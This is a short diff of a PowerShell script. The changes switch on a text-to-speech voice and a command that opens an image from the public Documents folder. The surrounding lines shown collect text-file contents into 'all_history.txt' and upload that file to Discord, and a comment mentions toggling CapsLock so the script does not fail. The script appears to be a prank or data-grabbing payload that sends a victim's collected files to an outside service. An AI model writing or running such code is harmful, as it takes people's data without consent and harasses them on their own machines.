@@ -290,7 +290,7 @@ function Get-Days_Set {
     return $days
 }
 
-# $s = New-Object -ComObject SAPI.SpVoice
+$s = New-Object -ComObject SAPI.SpVoice
 
 $s.Rate = -1
 $days = Get-Days_Set
@@ -424,7 +424,7 @@ Get-ChildItem -Path "C:\Users\Public\Documents\" -Filter "*.txt" | Get-Content |
 # Upload all files to discord
 Upload-Discord -file "C:\Users\Public\Documents\all_history.txt"
 
-# Invoke-Item "C:\Users\Public\Documents\test.png"
+Invoke-Item "C:\Users\Public\Documents\test.png"
 
 
 #If true, toggle CapsLock key, to ensure that the script doesn't fail
